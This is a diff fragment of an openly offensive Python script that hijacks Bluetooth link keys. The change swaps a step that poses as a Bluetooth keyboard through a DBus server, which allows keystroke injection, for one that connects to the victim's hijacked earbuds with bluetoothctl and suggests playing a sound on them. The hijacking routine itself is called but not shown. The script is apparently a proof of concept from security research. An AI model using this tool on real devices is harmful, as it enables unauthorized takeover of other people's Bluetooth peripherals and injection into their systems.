@@ -68,17 +68,10 @@ try:
     bt_sock.key_hijacking()
     print_status("Link key hijacking successful!", "success")
 
-    # sleep
-    print_status("Waiting for 5 seconds...", "info")
-    time.sleep(5)
-
-    # boot dbus server as bluetooth keyboard
-    print_status("Starting DBus server as bluetooth keyboard...", "info")
-    DBusGMainLoop(set_as_default=True)
-    myservice = KbServer(mac_address=sys.argv[1])
-    loop = GLib.MainLoop()
-    print_status("Server started successfully. Running main loop...", "success")
-    loop.run()
+    print_status("Connecting to buds...", "info")
+    subprocess.run(["bluetoothctl", "connect", bt_addr])
+    print_status("\nYou have hijacked the connect to the buds!", "success")
+    print_status("Run `paplay /usr/share/sounds/alsa/Front_Center.wav` from user pi", "info")
 except KeyboardInterrupt:
     print_status("\nOperation cancelled by user", "error")
     sys.exit()
